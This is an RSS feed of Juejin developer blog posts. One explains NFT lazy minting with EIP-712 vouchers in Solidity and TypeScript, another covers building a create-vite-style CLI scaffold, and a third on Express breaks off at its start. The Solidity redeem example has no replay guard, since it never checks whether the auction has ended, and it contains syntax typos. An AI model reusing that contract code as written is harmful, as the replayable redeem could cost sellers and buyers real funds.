<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[LazyMinting是如何实现的？]]></title>    <link>https://juejin.cn/post/7594817135128281122</link>    <guid>https://juejin.cn/post/7594817135128281122</guid>    <pubDate>2026-01-14T07:30:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594817135128281122" data-draft-id="7594813727053381666" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LazyMinting是如何实现的？"/> <meta itemprop="keywords" content="Solidity"/> <meta itemprop="datePublished" content="2026-01-14T07:30:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="gunner6"/> <meta itemprop="url" content="https://juejin.cn/user/360295547039437"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LazyMinting是如何实现的？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/360295547039437/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    gunner6
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:30:31.000Z" title="Wed Jan 14 2026 07:30:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">业务场景</h2>
<p>我们lazyMinting使用场景主要是针对nft的竞拍业务来做的。
creator可以在上架nft时，不需要真正的mint nft，而是等有合适的bidder来购买后，才去mint nft。
这样可以减少nft mint的成本，从而鼓励creator来创建更多的nft；</p>
<h2 data-id="heading-1">LazyMinting的实现思路：</h2>
<p>核心思路是通过EIP-712的TypeDataSign来验证签名：</p>
<p>用户在链下用privateKey进行签名，链上通过合约验证确认签名消息的合法性以及业务逻辑的合理性。 一但验证通过，立刻执行合约里的方法，mint nft，transfer给真正的买家。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d20648506b71499dbe09960116a0d469~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ3VubmVyNg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980631&amp;x-signature=mYjBgQYxo0pQBD8cgJP0bobL7VI%3D" alt="ntf_lazy-minting" loading="lazy"/></p>
<h2 data-id="heading-2">我们项目里具体实现方案是什么？</h2>
<ol>
<li>定义了auction合约, 记录 竞拍信息<code>ActionData</code>、NFT 购买者凭证信息<code>Voucher</code>；</li>
</ol>
<pre><code class="hljs language-solidity" lang="solidity">{
  // 竞拍信息
	struct AuctionDetails {
      address seller; // 卖家地址
      string uri; // nft信息
      uint256 startPrice;
      uint256 duration;
      // 最终竞拍人
      address bidder;
      uint256 bidPrice;
      bool isActive;
      bool isEnd;
      uint256 tokenId;
  }
  // 购买者的凭证
	struct NFTVoucher {
        string auctionId;
        uint256 bidPrice;
        bytes signature;
  }
  
  // 记录action信息
	 mapping(string =&gt; AuctionDetails))  public auctionIdToAuction;

  // 记录voucher
	mapping(string =&gt; NFTVoucher)) public auctionIdToVoucher;
}

</code></pre>
<ol start="2">
<li>
<p>当creator上架一个nft action的时候，传入auctionId，minPrice、duration这些信息，保存在map里；注意此时<code>bidder/tokenId</code>这些信息都是不存在的；</p>
</li>
<li>
<p>当用户出价购买时，组装数据，通过_signTypedData方法，调用钱包签名，生成一个Voucher，并且记录到链下；</p>
<pre><code class="hljs language-ts" lang="ts">  <span class="hljs-comment">/**
   * Creates a new NFTVoucher object and signs it using this LazyMinter's signing key.

   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">NFTVoucher</span>}
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">createVoucher</span>(<span class="hljs-params">auctionId, bidPrice</span>) {
    <span class="hljs-keyword">const</span> voucher = { auctionId, bidPrice };
    <span class="hljs-keyword">const</span> domain = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_signingDomain</span>();

    <span class="hljs-keyword">const</span> types = {
      <span class="hljs-title class_">NFTVoucher</span>: [
        { <span class="hljs-attr">name</span>: <span class="hljs-string">"auctionId"</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span> },
        { <span class="hljs-attr">name</span>: <span class="hljs-string">"bidPrice"</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">"uint256"</span> },
      ],
    };
    <span class="hljs-keyword">const</span> signature = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">signer</span>.<span class="hljs-title function_">_signTypedData</span>(domain, types, voucher);

    <span class="hljs-comment">// const recoveredAddress = ethers.utils.verifyTypedData(domain, types, voucher, signature);</span>
    <span class="hljs-comment">// const expectedSignerAddress = this.signer.address;</span>
    <span class="hljs-comment">// assert(recoveredAddress === expectedSignerAddress); 单纯验证下代码逻辑</span>
    <span class="hljs-comment">// console.log("recoveredAddress = " + recoveredAddress);</span>

    <span class="hljs-keyword">return</span> {
      ...voucher,
      signature,
    };
  }
</code></pre>
</li>
<li>
<p>当竞拍结束，或者creator提前结束时，选择一个出价高的bidder作为获胜者。 构造一个Winner凭证: <code>WinnerVoucher</code></p>
<pre><code class="hljs language-ts" lang="ts">{
  <span class="hljs-attr">auctionId</span>: <span class="hljs-string">"auction123"</span>,
  <span class="hljs-attr">bidder</span>: <span class="hljs-string">"0x中标者地址"</span>,
  <span class="hljs-attr">bidPrice</span>: <span class="hljs-number">1000000000000000000</span>,
  <span class="hljs-attr">nftAddress</span>: <span class="hljs-string">"0xNFT合约地址"</span>,
  <span class="hljs-attr">signature</span>: <span class="hljs-string">"卖家的签名"</span>
}
</code></pre>
</li>
<li>
<p>中标的bidder去链上进行redeem，提交两个voucher: 自身出价的voucher，卖家选择的voucher。</p>
</li>
<li>
<p>合约会验证的两个voucher的合法性，检查数据一致等等</p>
<ol>
<li>address和Voucher里签名的用户是否是同一个，并且验证调用redeem的msg.value &gt; Voucher.bidderPrice</li>
</ol>
<pre><code class="hljs language-solidity" lang="solidity">// 新增结构体
struct WinnerVoucher {
    string auctionId;
    address bidder;
    uint256 bidPrice;
    bytes signature;
}

// 计算哈希
function _hashWinner(WinnerVoucher calldata voucher)
    internal
    view
    returns (bytes32)
{
    bytes32 WINNER_VOUCHER_TYPE_HASH = keccak256(
        "WinnerVoucher(string auctionId,address bidder,uint256 bidPrice)"
    );
    bytes32 structHash = keccak256(
        abi.encode(
            WINNER_VOUCHER_TYPE_HASH,
            keccak256(bytes(voucher.auctionId)),
            voucher.bidder,
            voucher.bidPrice
        )
    );
    return _hashTypedDataV4(structHash);
}

// 新增验证函数
function _verifyWinner(WinnerVoucher calldata voucher)
    internal
    view
    returns (address)
{
    bytes32 digest = _hashWinner(voucher);
    return ECDSA.recover(digest, voucher.signature);
}

// 修改后的 redeem 函数
function redeemWithWinnerVoucher(
    address _nftAddress,
    string memory _auctionId,
    NFTVoucher calldata nftVoucher,
    WinnerVoucher calldata winnerVoucher
) public payable returns (uint256) {
    // 1. 验证 NFT voucher 是中标者签的
    address nftSigner = _verify(nftVoucher);
    require(msg.sender == nftSigner, "Invalid NFT signature");
    
    // 2. 验证 winner voucher 是卖家签的
    AuctionDetails storage auction = auctionIdToAuction[_auctionId];
    address winnerSigner = _verifyWinner(winnerVoucher);
    require(winnerSigner == auction.seller, "Invalid seller signature");
    
    // 3. 验证 winner voucher 指定的 bidder 就是调用者
    require(msg.sender == winnerVoucher.bidder, "NOT the winner");
    
    // 4. 验证出价金额
    require(msg.value &gt;= winnerVoucher.bidPrice, "Insufficient funds");
    
    // 5. mint 并转移 NFT
    uint256 tokenId = nftContract.mint(_auctionId, auction.uri);
    nftContract.safeTransferFrom(address(this), msg.sender, tokenId);
    
    // 5. 将付款转账给卖家，这里假设是用 native token付款的
    (bool success, ) = auction.seller.call{value: winnerVoucher.bidPrice}("");
    require(success);
    
    // 7. 更新拍卖状态
    auction.bidder = winnerVoucher.bidder;
    auction.bidPrice = winnerVoucher.bidPrice;
    auction.isEnd = true;
    auction.tokenId = tokenId;
    
    return tokenId;
}
</code></pre>
</li>
</ol>
<p>repo: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F6gunner%2Fscaffold-eth-challenges%2Ftree%2Fchallenge-6-nft-marketplace" target="_blank" title="https://github.com/6gunner/scaffold-eth-challenges/tree/challenge-6-nft-marketplace" ref="nofollow noopener noreferrer">github.com/6gunner/sca…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[模仿 create-vite / create-vue 风格写一个现代脚手架]]></title>    <link>https://juejin.cn/post/7594813727053414434</link>    <guid>https://juejin.cn/post/7594813727053414434</guid>    <pubDate>2026-01-14T07:33:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594813727053414434" data-draft-id="7594785614177452072" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="模仿 create-vite / create-vue 风格写一个现代脚手架"/> <meta itemprop="keywords" content="前端,后端"/> <meta itemprop="datePublished" content="2026-01-14T07:33:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端小小栈"/> <meta itemprop="url" content="https://juejin.cn/user/1081575170131006"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            模仿 create-vite / create-vue 风格写一个现代脚手架
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1081575170131006/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端小小栈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:33:54.000Z" title="Wed Jan 14 2026 07:33:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><pre><code class="hljs language-text" lang="text">你有没有发现，现在新建一个前端项目的方式跟三五年前已经完全不一样了？

现在（2025~2026主流做法）：
npm create vite@latest
npx create-next-app@latest
npm create vue@latest
npm create astro@latest
npm create solid@latest
npm create svelte@latest
bun create react
pnpm create vite
</code></pre>
<p>这背后其实是一个非常重要的演进方向：</p>
<p><strong>「npm create xxx」这个写法几乎成了 2024-2026 年新建前端/全栈项目的事实标准</strong></p>
<p>而绝大多数人真正用到的、体验最好的那一批「create-xxx」，几乎都长得差不多，它们基本上都遵循了同一套「现代轻量脚手架模板」：</p>
<h3 data-id="heading-0">现代 create-xxx 脚手架的典型特征（2025-2026版）</h3>























































<table><thead><tr><th>特性</th><th>说明</th><th>常见实现工具/库</th></tr></thead><tbody><tr><td>命令形式</td><td><code>npm create xxx@latest</code> / <code>pnpm create xxx</code> / <code>bun create xxx</code></td><td>—</td></tr><tr><td>几乎不用全局安装</td><td>直接用 npx / bunx / pnpm dlx 执行</td><td>npm 的 create- 协议</td></tr><tr><td>极简依赖</td><td>通常只有 4~8 个运行时依赖</td><td>cac / commander + prompts</td></tr><tr><td>彩色 + 现代终端感</td><td>必须有颜色、loading 动画、渐变 logo</td><td>picocolors / kolorist / chalk</td></tr><tr><td>交互式问题</td><td>非常克制的问题数量（通常 2~5 个）</td><td>prompts / enquirer</td></tr><tr><td>模板直接拷贝或 degit</td><td>不再用 ejs 复杂渲染，更多直接拷贝 + 少量文本替换</td><td>fs-extra / degit</td></tr><tr><td>可选依赖自动安装</td><td>创建完立刻问你要不要 install</td><td>execa / child_process</td></tr><tr><td>支持 --template / --yes 跳过</td><td>喜欢 CI/CD 和喜欢极简的人最爱</td><td>cac / yargs / commander</td></tr><tr><td>模板文件夹结构清晰</td><td>template/react-ts、template/vue-ts、template/minimal 等</td><td>—</td></tr></tbody></table>
<h3 data-id="heading-1">目前（2026年初）最主流的几种「技术路线图」</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[想做现代脚手架] --&gt; B{选几条路?}

    B --&gt; C1[最推荐 极简现代风]
    B --&gt; C2[企业级/复杂需求风]
    B --&gt; C3[老派但稳定风]

    C1 --&gt; D1[cac + prompts + picocolors&lt;br&gt;+ fs-extra + execa]
    C1 --&gt; D2["bunx degit" 路线&lt;br&gt;几乎零依赖]

    C2 --&gt; D3[oclif 全家桶]
    C2 --&gt; D4[oclif + plugins 架构]

    C3 --&gt; D5[commander + inquirer + chalk]
    C3 --&gt; D6[yargs + enquirer]
</code></pre>
<h3 data-id="heading-2">2026 年最被推荐的「极简现代风」技术栈组合</h3>
<p>（绝大多数新项目都在用或往这个方向迁移）</p>
<pre><code class="hljs language-bash" lang="bash">核心依赖（共5个）：
├── cac               <span class="hljs-comment"># 超级轻量的命令行参数解析（比 commander 轻很多）</span>
├── prompts           <span class="hljs-comment"># 目前体验最好的交互式问答库（异步友好）</span>
├── picocolors        <span class="hljs-comment"># 目前最快的终端颜色库（取代 chalk）</span>
├── fs-extra          <span class="hljs-comment"># 增强版 fs（copy、emptyDir、ensureDir 等超好用）</span>
└── execa             <span class="hljs-comment"># 现代版的 child_process.exec（更好用 Promise）</span>

极受欢迎的加分项（按使用频率排序）：
1. degit              <span class="hljs-comment"># 从 github 仓库快速下载模板（git clone 替代品）</span>
2. ora                <span class="hljs-comment"># loading 动画小 spinner</span>
3. gradient-string    <span class="hljs-comment"># 做个好看的彩虹 logo（锦上添花）</span>
4. minimatch          <span class="hljs-comment"># 做文件过滤时偶尔会用到</span>
</code></pre>
<h3 data-id="heading-3">极简现代脚手架典型代码结构（2026主流写法参考）</h3>
<pre><code class="hljs language-javascript" lang="javascript">my-create-tool/
├── bin/
│   └── index.<span class="hljs-property">mjs</span>           ← #!<span class="hljs-regexp">/usr/</span>bin/env node
├── src/
│   ├── index.<span class="hljs-property">mjs</span>
│   ├── prompts.<span class="hljs-property">mjs</span>         ← 所有问题逻辑放这里
│   ├── copyTemplate.<span class="hljs-property">mjs</span>
│   ├── installDeps.<span class="hljs-property">mjs</span>
│   └── templates/          ← 真正要拷贝的内容都在这里
│       ├── vue-ts/
│       ├── react-ts/
│       ├── minimal/
│       └── node-api/
└── package.<span class="hljs-property">json</span>
</code></pre>
<p>最核心的几行代码大概长这样（简化版）：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { cac } <span class="hljs-keyword">from</span> <span class="hljs-string">'cac'</span>
<span class="hljs-keyword">import</span> prompts <span class="hljs-keyword">from</span> <span class="hljs-string">'prompts'</span>
<span class="hljs-keyword">import</span> pc <span class="hljs-keyword">from</span> <span class="hljs-string">'picocolors'</span>
<span class="hljs-keyword">import</span> { copy } <span class="hljs-keyword">from</span> <span class="hljs-string">'fs-extra'</span>
<span class="hljs-keyword">import</span> { execaCommand } <span class="hljs-keyword">from</span> <span class="hljs-string">'execa'</span>

<span class="hljs-keyword">const</span> cli = <span class="hljs-title function_">cac</span>(<span class="hljs-string">'create-my-tool'</span>)

cli.<span class="hljs-title function_">command</span>(<span class="hljs-string">'[dir]'</span>, <span class="hljs-string">'项目目录名'</span>)
   .<span class="hljs-title function_">option</span>(<span class="hljs-string">'--template &lt;name&gt;'</span>, <span class="hljs-string">'指定模板'</span>)
   .<span class="hljs-title function_">action</span>(<span class="hljs-keyword">async</span> (dir, options) =&gt; {
      <span class="hljs-keyword">const</span> targetDir = dir || (<span class="hljs-keyword">await</span> <span class="hljs-title function_">askProjectName</span>()).<span class="hljs-property">name</span>
      <span class="hljs-keyword">const</span> template = options.<span class="hljs-property">template</span> || (<span class="hljs-keyword">await</span> <span class="hljs-title function_">askTemplate</span>()).<span class="hljs-property">template</span>

      <span class="hljs-keyword">await</span> <span class="hljs-title function_">copyTemplate</span>(template, targetDir)
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(pc.<span class="hljs-title function_">green</span>(<span class="hljs-string">'项目创建完成～'</span>))

      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">await</span> <span class="hljs-title function_">shouldInstall</span>()) {
         <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'正在安装依赖...'</span>)
         <span class="hljs-keyword">await</span> <span class="hljs-title function_">execaCommand</span>(<span class="hljs-string">'pnpm install'</span>, { <span class="hljs-attr">cwd</span>: targetDir })
      }
   })

cli.<span class="hljs-title function_">help</span>().<span class="hljs-title function_">parse</span>()
</code></pre>
<h3 data-id="heading-4">总结：2026 年你应该往哪个方向写脚手架？</h3>
<pre><code class="hljs language-text" lang="text">如果你是：
个人/小团队/个人品牌/内部工具         →   强烈推荐「极简现代风」 cac + prompts + picocolors
中大型团队/需要很多子命令/复杂插件系统   →   考虑 oclif（学习成本高但未来可扩展）
老项目维护/团队成员前端经验比较传统     →   commander + inquirer + chalk 仍然安全可接受

当前性价比最高、最多人正在用、最容易做出「高级感」的组合是：

cac + prompts + picocolors + fs-extra + execa (+ degit)

这就是 2025-2026 年绝大多数「让人用起来很爽」的 create-xxx 工具背后真正的主流技术路线。
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[必知 Express和 MVC]]></title>    <link>https://juejin.cn/post/7594919272687812634</link>    <guid>https://juejin.cn/post/7594919272687812634</guid>    <pubDate>2026-01-14T07:28:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594919272687812634" data-draft-id="7594759496369094666" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="必知 Express和 MVC"/> <meta itemprop="keywords" content="前端,Node.js,全栈"/> <meta itemprop="datePublished" content="2026-01-14T07:28:35.000Z"/> <meta itemprop="image" 